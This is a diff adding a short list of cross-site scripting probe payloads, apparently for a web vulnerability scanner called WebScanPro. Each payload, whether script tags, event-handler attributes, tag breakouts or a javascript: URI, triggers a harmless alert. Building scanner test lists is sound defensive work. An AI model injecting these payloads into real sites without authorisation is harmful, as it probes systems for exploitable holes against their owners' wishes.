@@ -1,0 +1,9 @@
+<script>alert('WebScanPro_XSS')</script>
+"><script>alert('WebScanPro_XSS')</script>
+<img src="x" onerror="alert('WebScanPro_XSS')">
+"><img src="x" onerror="alert('WebScanPro_XSS')">
+<svg onload="alert('WebScanPro_XSS')"></svg>
+</textarea><script>alert('WebScanPro_XSS')</script>
+<input autofocus onfocus="alert('WebScanPro_XSS')">
+javascript:alert('WebScanPro_XSS')
+<body onload="alert('WebScanPro_XSS')">
